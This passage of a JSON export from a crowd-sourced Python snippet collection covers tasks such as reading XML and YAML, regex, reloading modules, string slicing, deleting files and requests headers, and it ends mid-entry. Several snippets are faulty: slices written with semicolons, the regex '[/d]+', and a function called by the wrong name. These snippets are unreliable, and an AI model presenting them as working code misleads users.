    "description": "from xml.dom import minidom  # parse an xml file by name mydoc = minidom.parse('items.xml')  items = mydoc.getElementsByTagName('item')  # one specific item attribute print('Item #2 attribute:') print(items[1].attributes['name'].value)  # all item attributes print('\\nAll attributes:') for elem in items:     print(elem.attributes['name'].value)  # one specific item's data print('\\nItem #2 data:') print(items[1].firstChild.data) print(items[1].childNodes[0].data)  # all items data print('\\nAll item data:') for elem in items:     print(elem.firstChild.data)\nimport xml.etree.ElementTree as ET  root = ET.fromstring(country_data_as_string)\nimport xml.etree.ElementTree as ET  tree = ET.parse('filename.xml') #this gets the file into a tree structure tree_root = tree.getroot() #this gives us the root element of the file\nfrom xml.etree.ElementTree import XML, fromstring myxml = fromstring(text)\nroot = ET.fromstring(xmlData)\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3755,
    "keyword": null,
    "link": null,
    "title": " python read yaml",
    "description": "# read_categories.py file  import yaml  with open(r'E:\\data\\categories.yaml') as file:     documents = yaml.full_load(file)      for item, doc in documents.items():         print(item, \":\", doc) \nimport yaml  dict_file = [{'sports' : ['soccer', 'football', 'basketball', 'cricket', 'hockey', 'table tennis']}, {'countries' : ['Pakistan', 'USA', 'India', 'China', 'Germany', 'France', 'Spain']}]  with open(r'E:\\data\\store_file.yaml', 'w') as file:     documents = yaml.dump(dict_file, file) \nimport yaml  # Read YAML file with open(\"data.yaml\", 'r') as stream:     data_loaded = yaml.safe_load(stream)\n{'a_key': 'a_value', 'another_key': 'another_value', 'nested_dictionary': {'nested_key': 'nested_value'}}\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3756,
    "keyword": null,
    "link": null,
    "title": " python reading lines from a text file",
    "description": "with open(\"file.txt\") as file_in:     lines = []     for line in file_in:         lines.append(line)\nwith open(filename) as f:     content = f.readlines() # you may also want to remove whitespace characters like `\\n` at the end of each line content = [x.strip() for x in content] \n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3757,
    "keyword": null,
    "link": null,
    "title": " python readlines without n",
    "description": "temp = file.read().splitlines() \n# converts read file into a list without newlines temp = file.read().splitlines()\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3758,
    "keyword": null,
    "link": null,
    "title": " python reciprocal",
    "description": "import numpy as np import pandas as pd #There are two ways to get the reciprocal of a dataframe: #First way: df.rdiv(1) #Second way: np.reciprocal(df) #If you want the reciprocal of just one row then use .iloc[]                   #to do that\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3759,
    "keyword": null,
    "link": null,
    "title": " python reference script directory",
    "description": ">>> import os >>> print(os.path.dirname(os.path.realpath(__file__)))  C:\\File\\Location # Does not contain filename\n",
    "reg_date": "2021-10-12T11:34:00.000Z"
  },
  {
    "id": 3760,
    "keyword": null,
    "link": null,
    "title": " python regex for a url",
    "description": "import re  url = '<p>Hello World</p><a href=\"http://example.com\">More Examples</a><a href=\"http://example2.com\">Even More Examples</a>'  urls = re.findall('https?://(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+', url)  >>> print urls ['http://example.com', 'http://example2.com'] \nDon't try to make your own regular expression for matching URLs, use someone else's who has already solved such problems, like this one.\n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3761,
    "keyword": null,
    "link": null,
    "title": " python regex numbers only",
    "description": "import re re.compile(r'[/d]+')  # /d refers to any digit # use other regex patters for ore modifcations # This can extract the numbers from the regex \nimport re  # Example with integers and floats both positive and negative and scientific notation. target_str = 'I live at 9-162 Malibeu. My phone number is +351911199911. I have 5.50 dollars with me, but I have a net income of -1.01 per day which is about -1 dollar a day with an error of +-.01. Also the earth has a mass of 5.972e24 kg or about 6e24 kg.' # Depending on what you want (p=positive, n=negative): regex_expressions = {     'p_ints' :            \"\\d+\",     'pn_ints' :           \"[-+]?\\d+\",     'p_floats' :          \"\\d*\\.\\d+\",     'pn_floats' :         \"[-+]?\\d*\\.\\d+\",     'scientific_notation':\"[-+]?\\d+(?:\\.\\d+)?e[-+]?\\d+\",     'pn_floats_or_ints' : \"(?:[-+]?)(?:\\d*\\.\\d+|\\d+)\",     'universal':          \"(?:[-+]?)(?:\\d+(?:\\.\\d+)?e[-+]?\\d+|\\d*\\.\\d+|\\d+)\" }  regex_results = dict()  for target_type, regex_expression in zip (regex_expressions.keys(), regex_expressions.values()):     regex_results[target_type] = re.findall(regex_expression, target_str)     print(target_type,':',regex_results[target_type])  print ('\\nThese results are still strings, but can easily be turned into floats or ints:') for number in regex_results['universal']:     print(float(number))  \"\"\" Used RegEx symbols:     [] : look for any character inside the brackets     \\d : look for any digit     \\. : look for a dot (.)     + : look for one or more occurences of the previous expression     * : look for zero or more occurences of the previous expression     ? : look for zero or one occurences of the previous expression     (?:...) : create a non-capturing group     | : look for either of the previous expressions (OR operator)       Short explanation of each regex:     -> positive integers: \\d+         look for one or more digits     -> positive or negative integers: [-+]?\\d+         look for one or more digits, potentially preceded by a '-' or a '+'     -> positive floats: \\d*\\.\\d+         look for zero or more digits, followed by a dot, followed by one or more digits (a lazy representation such as '.3' works in this case). Scientific notation is not allowed.     -> positive or negative floats: [-+]?\\d*\\.\\d+]         look for zero or more digits, followed by a dot, followed by one or more digits, potentially preceded by a '-' or a '+'     -> scientific notation: [-+]?\\d+(?:\\.\\d+)?e[-+]?\\d+         look for any '+' or '-' signs, if they exist. Look for one or more digits, potentially followed by a dot and decimal part. Look for an 'e', followed by one or more digits     -> any number not in scientific notation: (?:[-+]?)(?:\\d*\\.\\d+|\\d+)         look for any '+' or '-' signs, if they exist. Look for zero or more digits, followed by a dot, followed by one or more digits (float) OR look for one or more digits (integer).     -> any number: (?:[-+]?)(?:\\d*\\.\\d+|\\d+|\\d?e[-+]?\\d?)         basically look for '+' or '-' and then do an OR between the previous expressions using non capturing groups. \"\"\"  \"\"\" OUTPUT:     p_ints : ['9', '162', '351911199911', '5', '50', '1', '01', '1', '01', '5', '972', '24', '6', '24']     pn_ints : ['9', '-162', '+351911199911', '5', '50', '-1', '01', '-1', '01', '5', '972', '24', '6', '24']     p_floats : ['5.50', '1.01', '.01', '5.972']     pn_floats : ['5.50', '-1.01', '-.01', '5.972']     scientific_notation : ['5.972e24', '6e24']     pn_floats_or_ints : ['9', '-162', '+351911199911', '5.50', '-1.01', '-1', '-.01', '5.972', '24', '6', '24']     universal : ['9', '-162', '+351911199911', '5.50', '-1.01', '-1', '-.01', '5.972e24', '6e24']          These results are still strings, but can easily be turned into floats or ints:     9.0     -162.0     351911199911.0     5.5     -1.01     -1.0     -0.01     5.972e+24     6e+24 \"\"\"\n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3762,
    "keyword": null,
    "link": null,
    "title": " python regex replace all non alphanumeric characters",
    "description": "import re  s = re.sub('[^0-9a-zA-Z]+', '*', s)\n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3763,
    "keyword": null,
    "link": null,
    "title": " python region",
    "description": "#region // some methods #endregion \n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3764,
    "keyword": null,
    "link": null,
    "title": " python reimport module",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \nfrom importlib import reload   import foo  while True:     # Do some things.     if is_changed(foo):         foo = reload(foo)\n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3765,
    "keyword": null,
    "link": null,
    "title": " python reimport module after change",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3766,
    "keyword": null,
    "link": null,
    "title": " python reimport py file",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3767,
    "keyword": null,
    "link": null,
    "title": " python reload class",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \nimport sys del sys.modules['myfile'] from myfile import MyClass modifiedmc = MyClass() \n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3768,
    "keyword": null,
    "link": null,
    "title": " python reload file if changed",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3769,
    "keyword": null,
    "link": null,
    "title": " python reload function from file",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:34:01.000Z"
  },
  {
    "id": 3770,
    "keyword": null,
    "link": null,
    "title": " python reload function in shell",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3771,
    "keyword": null,
    "link": null,
    "title": " python reload import",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \nfrom importlib import reload   import foo  while True:     # Do some things.     if is_changed(foo):         foo = reload(foo)\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3772,
    "keyword": null,
    "link": null,
    "title": " python reload lib jupyter notebook %reload",
    "description": "%load_ext autoreload %autoreload 2\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3773,
    "keyword": null,
    "link": null,
    "title": " python reload module without restarting",
    "description": "import my_module\t\t\t\t# initial import of my_module  from importlib import reload \t my_module = reload(my_module)\t# reload of my_module \n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3774,
    "keyword": null,
    "link": null,
    "title": " python remove a key from a dictionary",
    "description": "del dictionary['key']\n# Basic syntax: del dictionary['key']  # Example usage: dictionary = {'a': 3, 'b': 2, 'c': 3, 'd': 4, 'e': 5} del dictionary['c'] # Remove the 'c' key:value pair from dictionary dictionary --> {'a': 3, 'b': 2, 'd': 4, 'e': 5}\n>>> # initialise a dictionary with the keys &ldquo;city&rdquo;, &ldquo;name&rdquo;, &ldquo;food&rdquo; >>> person1_information = {'city': 'San Francisco', 'name': 'Sam', \"food\": \"shrimps\"}  >>> # delete the key, value pair with the key &ldquo;food&rdquo; >>> del person1_information[\"food\"]  >>> # print the present personal1_information. Note that the key, value pair &ldquo;food&rdquo;: &ldquo;shrimps&rdquo; is not there anymore. >>> print(person1_information) {'city': 'San Francisco', 'name': 'Sam'}\nmy_dict.pop('key', None)\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3775,
    "keyword": null,
    "link": null,
    "title": " python remove all except numbers",
    "description": ">>> import re >>> re.sub('\\D', '', 'aas30dsa20') '3020'\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3776,
    "keyword": null,
    "link": null,
    "title": " python remove cached package",
    "description": "# to Pip install Add --no-cache-dir parameter before intsall  pip --no-cache-dir install\n# Add --no-cache-dir before install pip --no-cache-dir install scipy \n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3777,
    "keyword": null,
    "link": null,
    "title": " python remove directory not empty",
    "description": "import shutil  shutil.rmtree('/folder_name')\nimport shutil  shutil.rmtree('/folder_name') shutil.rmtree('/folder_name', ignore_errors=True)  # for read only files\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3778,
    "keyword": null,
    "link": null,
    "title": " python remove duplicates from a list",
    "description": "# HOW TO REMOVE DUPLICATES FROM A LIST: # 1) CREATE A LIST my_list = [1, 2, 3, 4, 5, 5, 5, 1] # 2) CONVERT IT TO A SET AND THEN BACK INTO A LIST my_list = list(set(my_list)) # 3) DONE!  print(my_list) #WILL PRINT: [1, 2, 3, 4, 5]\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3779,
    "keyword": null,
    "link": null,
    "title": " python remove empty folders",
    "description": "import os def drop_empty_folders(directory):     \"\"\"Verify that every empty folder removed in local storage.\"\"\"      for dirpath, dirnames, filenames in os.walk(directory, topdown=False):         if not dirnames and not filenames:             os.rmdir(dirpath)\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3780,
    "keyword": null,
    "link": null,
    "title": " python remove empty string from list",
    "description": "def compact(lst):     return list(filter(None, lst))  compact([0, 1, False, 2, '', 3, 'a', 's', 34])     # [ 1, 2, 3, 'a', 's', 34 ]\nwithout_empty_strings = [string for string in a_list if string != \"\"]\nlist2 = filter(None, list1)\n[name for name in starring if name.strip()]\n''' This is a classic python3 doh!.  A filter is a special iterable object you can iterate over. However, much like a generator, you can iterate over it only once. So, by calling list(people2), you are iterating over each element of the filter object to generate the list. At this point, you've reached the end of the iterable and nothing more to return. '''\n",
    "reg_date": "2021-10-12T11:34:02.000Z"
  },
  {
    "id": 3781,
    "keyword": null,
    "link": null,
    "title": " python remove everything except numbers from string",
    "description": ">>> import re >>> re.sub('\\D', '', 'aas30dsa20') '3020'\ndef AdvancedIn(in_string):     res = ''.join(i for i in input(in_string) if i.isdigit())     return res\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3782,
    "keyword": null,
    "link": null,
    "title": " python remove first and last character from string",
    "description": "string = string[1:-1]\ns = \"hello\" print s[1:]\ns = \":dfa:sif:e\" print(s[1:])  prints:   dfa:sif:e\nr = \"hello\" r = r[1:] print(r) # ello\nstring = \"Hello World\" print(string[1;]) # Output => ello World print(string[;-1]) # Output => Hello Worl print(string[1;-1]) # Output => ello Worl\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3783,
    "keyword": null,
    "link": null,
    "title": " python remove last character from string",
    "description": "str =  \"string\" str = str[:-1]  # Returns \"strin\"\nst =  \"abcdefghij\" st = st[:-1]  # Returns string with last character removed\nstring = \"Hello World\" string = string[:-1]  # This overwrite the string to have the last letter removed. print(string)# Then we print the variable string\n#Removing last three characters foo = foo[:-3]\nstr = \"abc\" str = str[:-1] print(str)  >>> ab\nyour_string = \"hello\" your_string = your_string[:-1] # this removes the last character from your string \n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3784,
    "keyword": null,
    "link": null,
    "title": " python remove last characters from string",
    "description": "st =  \"abcdefghij\" st = st[:-1]  # Returns string with last character removed\nstr = \"abc\" str = str[:-1] print(str)  >>> ab\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3785,
    "keyword": null,
    "link": null,
    "title": " python remove letters from string",
    "description": "def nospecial(text): \timport re \ttext = re.sub(\"[^a-zA-Z0-9]+\", \"\",text) \treturn text\ns = 'abc12321cba'  print(s.replace('a', ''))  =>s out:bc12321cb\ns = 'abc12321cba'  print(s.replace('a', '')) \nstring = \"abc123\" # Method 1 ''.join(char for char in string if char.isdigit())  #Method 2 import re re.sub(\"[^0-9]\", \"\", string)\ns = 'ab12abc34ba' print(s.replace('ab', ''))\nfor char in line:     if char in \" ?.!/;:\":         line.replace(char,'')\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3786,
    "keyword": null,
    "link": null,
    "title": " python remove n random elements from a list",
    "description": "# Formula to delete n random elements from a list: import random def delete_random_elems(input_list, n):     to_delete = set(random.sample(range(len(input_list)), n))     return [x for i,x in enumerate(input_list) if not i in to_delete]  # Note, this function doesn't take a seed value, so it will be different # \tevery time you run it.     # Example usage: your_list = ['so', 'many', 'words', 'I', 'want', 'to', 'sample'] delete_rand_items(your_list, 3) # Randomly delete 3 elements from the list --> ['so', 'many', 'want', 'sample']\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3787,
    "keyword": null,
    "link": null,
    "title": " python remove new line",
    "description": "line = line.strip('\\n') line = line.strip('\\t')\na_string = a_string.rstrip(\"\\n\")\nlines = (\"line 1 \\r\\n\") lines.rstrip(\"\\n\\r\")\nmylist = [] # Assuming that you have loaded data into a lines variable.  for line in lines:     mylist.append(line.strip().split('\\t')\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3788,
    "keyword": null,
    "link": null,
    "title": " python remove non empty read only directory",
    "description": "     import os     import stat     import shutil     def del_ro_dir(dir_name):         '''Remove Read Only Directories'''         for (root, dirs, files) in os.walk(dir_name, topdown=True):             os.chmod(root,                 # For user ...                 stat.S_IRUSR |                 stat.S_IWUSR |                 stat.S_IXUSR |                 # For group ...                 stat.S_IWGRP |                 stat.S_IRGRP |                 stat.S_IXGRP |                 # For other ...                 stat.S_IROTH |                 stat.S_IWOTH |                 stat.S_IXOTH             )         shutil.rmtree(dir_name)      if __name__ == '__main__':         del_ro_dir('') \n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3789,
    "keyword": null,
    "link": null,
    "title": " python remove non letters from string",
    "description": "def nospecial(text): \timport re \ttext = re.sub(\"[^a-zA-Z0-9]+\", \"\",text) \treturn text\n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3790,
    "keyword": null,
    "link": null,
    "title": " python remove read only file",
    "description": "     import os     import stat     def rmv_rof(file_name):         '''Remov Read Only Files'''         if os.path.exists(file_name):             os.chmod(file_name, stat.S_IWRITE)             os.remove(file_name)         else:             print('The file does not exist.')     rmv_rof('file_name_here') \n",
    "reg_date": "2021-10-12T11:34:03.000Z"
  },
  {
    "id": 3791,
    "keyword": null,
    "link": null,
    "title": " python remove x and y values on plots",
    "description": "plt.gca().axes.get_xaxis().set_visible(False) plt.gca().axes.get_yaxis().set_visible(False)\n# Basic syntax: ax.set_yticklabels([]) ax.set_xticklabels([])  # Example usage: import matplotlib.pyplot as plt  # Create Figure and Axes instances fig,ax = plt.subplots(1)  # Make your plot, set your axes labels ax.plot(range(1, 10),range(10, 1, -1)) ax.set_ylabel('Y Label') ax.set_xlabel('X Label')  # Turn off tick labels &mdash; tick marks remain but values are removed ax.set_yticklabels([]) ax.set_xticklabels([])  plt.show()\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3792,
    "keyword": null,
    "link": null,
    "title": " python removing \\n from string",
    "description": "line = line.strip('\\n') line = line.strip('\\t')\nexample_string = \"Hello there\"  def remove_chars(n, string):     list_of_chars_in_string = [char for char in string]           for num in range(n):         list_of_chars_in_string.pop() # Removes last n characters in string          new_string = ''.join(list_of_chars_in_string)     return new_string\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3793,
    "keyword": null,
    "link": null,
    "title": " python rename file",
    "description": "import os   os.rename('guru99.txt','career.guru99.txt') \nimport os   os.rename('old_name.txt','new_name.txt') \nos.rename(src, dst)\nimport os os.rename(r'C:\\Users\\Ron\\Desktop\\Test\\Products.txt',r'C:\\Users\\Ron\\Desktop\\Test\\Shipped Products.txt') \nimport os  old_file_name = \"/home/career_karma/raw_data.csv\" new_file_name = \"/home/career_karma/old_data.csv\"  os.rename(old_file_name, new_file_name)  print(\"File renamed!\")\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3794,
    "keyword": null,
    "link": null,
    "title": " python repeat every n seconds",
    "description": "#executes printit() every 5s import threading def printit():   threading.Timer(5.0, printit).start()   print \"Hello, World!\"  printit()\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3795,
    "keyword": null,
    "link": null,
    "title": " python repeating scheduler",
    "description": "import schedule import time  def job():    print(\"I'm working...\")  schedule.every(10).minutes.do(job) schedule.every().hour.do(job) schedule.every().day.at(\"10:30\").do(job)  while 1:    schedule.run_pending()    time.sleep(1) \n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3796,
    "keyword": null,
    "link": null,
    "title": " python replace backslash with forward slash",
    "description": "path = r\"C:\\Users\\user\\Pharmacy 2012-2016 Monthly.xlsx\".replace(\"\\\\\",\"/\")\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3797,
    "keyword": null,
    "link": null,
    "title": " python replace first",
    "description": "'TESTstringTEST'.replace('TEST', 'replaced', 1) # output 'replacedstringTEST'\ntext.replace(\"text\", \"new\", count) # count is the number of instances you want to replace\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3798,
    "keyword": null,
    "link": null,
    "title": " python replace first occurrence in string",
    "description": "# string replace() function perfectly solves this problem:  # string.replace(s, old, new[, maxreplace])  # Return a copy of string s with all occurrences of substring old replaced  # by new. If the optional argument maxreplace is given, the first maxreplace  # occurrences are replaced.  >>> u'longlongTESTstringTEST'.replace('TEST', '?', 1) u'longlong?stringTEST'\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3799,
    "keyword": null,
    "link": null,
    "title": " python replace regex",
    "description": "import re s = \"Example String\" replaced = re.sub('[ES]', 'a', s) print replaced  # will print 'axample atring'\nimport re line = re.sub(r\"</?\\[\\d+>\", \"\", line)  # Comented version line = re.sub(r\"\"\"   (?x) # Use free-spacing mode.   <    # Match a literal '<'   /?   # Optionally match a '/'   \\[   # Match a literal '['   \\d+  # Match one or more digits   >    # Match a literal '>'   \"\"\", \"\", line) \nimport re s = \"Example String\" replaced = re.sub('[ES]', 'a', s) print replaced \nimport re  s = 'aaa@xxx.com bbb@yyy.com ccc@zzz.com'  print(re.sub('[a-z]*@', 'ABC@', s)) # ABC@xxx.com ABC@yyy.com ABC@zzz.com \nresult = re.sub(r\"Pulp Fiction\", \"Forrest Gump\", text) \n# Limit the maximum number of pattern occurrences to be replaced # replace three occurrence of space with '-' target_str = \"a b c d e f\" res_str = re.sub(r\"\\s\", \"-\", target_str, count=3) print(res_str) # Output a-b-c-d e f\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3800,
    "keyword": null,
    "link": null,
    "title": " python replace space with underscore",
    "description": "mystring.replace(\" \", \"_\")\nmystring.replace(\" \", \"_\") \n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3801,
    "keyword": null,
    "link": null,
    "title": " python request remove warning",
    "description": "#Removes request warnings from console  import requests from requests.packages.urllib3.exceptions import InsecureRequestWarning  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n",
    "reg_date": "2021-10-12T11:34:04.000Z"
  },
  {
    "id": 3802,
    "keyword": null,
    "link": null,
    "title": " python requests.get pdf An appropriate representation of the requested resource could not be found",
    "description": "headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'} r = requests.get(url=urlLogin, params=params, headers=headers)\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3803,
    "keyword": null,
    "link": null,
    "title": " python requests.get timeout",
    "description": "# Here is how to set a time out for requests.get in python # its simple! import requests  link = 'https://google.com'  request_from_link = requests.get(link, timeout=10)  # this causes the code to call a timeout if the connection or delays in  # between the reads take more than 10 seconds print(request_from_link)\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3804,
    "keyword": null,
    "link": null,
    "title": " python requests force ipv4",
    "description": "import socket import requests.packages.urllib3.util.connection as urllib3_cn   def allowed_gai_family():     family = socket.AF_INET    # force IPv4     return family   urllib3_cn.allowed_gai_family = allowed_gai_family\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3805,
    "keyword": null,
    "link": null,
    "title": " python requests header",
    "description": "url = 'https://api.github.com/some/endpoint' headers = {'user-agent': 'my-app/0.0.1'} r = requests.get(url, headers=headers)\nRaise an exception if a request is unsuccessful  import requests url = \"http://mock.kite.com/status/404\" r = requests.get(url) try:      r.raise_for_status() except requests.exceptions.HTTPError as e:      print e OUTPUT 404 Client Error: NOT FOUND\nb'{\\n  \"cookies\": {\\n    \"cookie1\": \"value1\"\\n  }\\n}\\n'\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3806,
    "keyword": null,
    "link": null,
    "title": " python requests set header cookie",
    "description": "import requests  cookies = {'enwiki_session': '17ab96bd8ffbe8ca58a78657a918558'}  r = requests.post('http://wikipedia.org', cookies=cookies) \n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3807,
    "keyword": null,
    "link": null,
    "title": " python requests set user agent",
    "description": "import requests  url = 'SOME URL'  headers = {     'User-Agent': 'My User Agent 1.0',     'From': 'youremail@domain.com'  # This is another valid field }  response = requests.get(url, headers=headers)\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3808,
    "keyword": null,
    "link": null,
    "title": " python requirements.txt",
    "description": "pip freeze #view requirements to be created (best done in virtual env) pip freeze > requirements.txt #create requirements.txt (best done in virtual env) pip install -r requirements.txt #install requirements.txt (best done in virtual env)\npip install -r requirements.txt \n# to generate the requirements.txt file: pip install pipreqs\t# Install via teminal. pipreqs path/to/project\t# Generate requirements.txt file # There is now a requirements.txt file in the project folder. # to install a requirements.txt file: pip install -r requirements.txt # please leave a like ;) \npip freeze > requirements.txt\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3809,
    "keyword": null,
    "link": null,
    "title": " python resize image",
    "description": "from PIL import Image image = Image.open(\"path/.../image.png\") image = image.resize((500,500),Image.ANTIALIAS) image.save(fp=\"newimage.png\")\nfrom PIL import Image  # Image.open() can also open other image types img = Image.open(\"some_random_image.jpg\") # WIDTH and HEIGHT are integers resized_img = img.resize((WIDTH, HEIGHT)) resized_img.save(\"resized_image.jpg\")\nfrom PIL import Image # set the base width of the result basewidth = 300 img = Image.open('somepic.jpg') # determining the height ratio wpercent = (basewidth/float(img.size[0])) hsize = int((float(img.size[1])*float(wpercent))) # resize image and save img = img.resize((basewidth,hsize), Image.ANTIALIAS) img.save('sompic.jpg') \nfrom PIL import Image from resizeimage import resizeimage  fd_img = open('test-image.jpeg', 'r') img = Image.open(fd_img) img = resizeimage.resize_cover(img, [200, 100]) img.save('test-image-cover.jpeg', img.format) fd_img.close() \nim = Image.open('image.jpg')   im = im.resize((w, h)) \nfrom PIL import Image  from resizeimage import resizeimage   with open('test-image.jpeg', 'r+b') as f:     with Image.open(f) as image:         cover = resizeimage.resize_cover(image, [200, 100])         cover.save('test-image-cover.jpeg', image.format) \n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3810,
    "keyword": null,
    "link": null,
    "title": " python restart script",
    "description": "sys.stdout.flush() os.execl(sys.executable, 'python', __file__, *sys.argv[1:])\nimport os  while 1:     os.system(\"python main.py\")     print \"Restarting...\"     exit()\nimport os import sys os.execl(sys.executable, sys.executable, *sys.argv) \n#our code var = input(\"Hi! I like cheese! Do you like cheese?\").lower() if var == \"yes\":   print(\"That's awesome!\")  # using While True while True: # Will keep going untill told not to using 'break'   var = input(\"Hi! I like cheese! Do you like cheese?\").lower()   if var == \"yes\":     print(\"That's awesome!\")\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3811,
    "keyword": null,
    "link": null,
    "title": " python return -1",
    "description": "def return_negative_one(): \treturn -1\n",
    "reg_date": "2021-10-12T11:34:05.000Z"
  },
  {
    "id": 3812,
    "keyword": null,
    "link": null,
    "title": " python return column names of pandas dataframe",
    "description": "# Basic syntax: your_dataframe.columns  # Note, if you want the column names as a list, just do: list(your_dataframe.columns)\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3813,
    "keyword": null,
    "link": null,
    "title": " python return first list element that contains substring",
    "description": "# Example usage: your_list = ['The answer to', 'the ultimate question', 'of life',       'the universe', 'and everything', 'is 42']  [idx for idx, elem in enumerate(your_list) if 'universe' in elem][0] --> 3 # The 0-based index of the first list element containing \"universe\"\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3814,
    "keyword": null,
    "link": null,
    "title": " python return first n key values pairs from dictionary",
    "description": "# Basic syntax: {key: dictionary[key] for key in list(dictionary)[:number_keys]}  # Note, number_keys is the number of key:value pairs to return from the #\tdictionary, not including the number_keys # itself # Note, Python is 0-indexed # Note, this formula be adapted to return any slice of keys from the  #\tdictionary following similar slicing rules as for lists  # Example usage 1: dictionary = {'a': 3, 'b': 2, 'c': 3, 'd': 4, 'e': 5} {key: dictionary[key] for key in list(dictionary)[:2]} --> {'a': 3, 'b': 2} # The 0th to 1st key:value pairs  # Example usage 2: dictionary = {'a': 3, 'b': 2, 'c': 3, 'd': 4, 'e': 5} {key: dictionary[key] for key in list(dictionary)[2:5]} --> {'c': 3, 'd': 4, 'e': 5} # The 2nd to 4th key:value pairs\nlist(islice(d.iteritems(), n)) 'Update for Python 3.6 list(islice(d.items(), n))\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3815,
    "keyword": null,
    "link": null,
    "title": " python return index of second match",
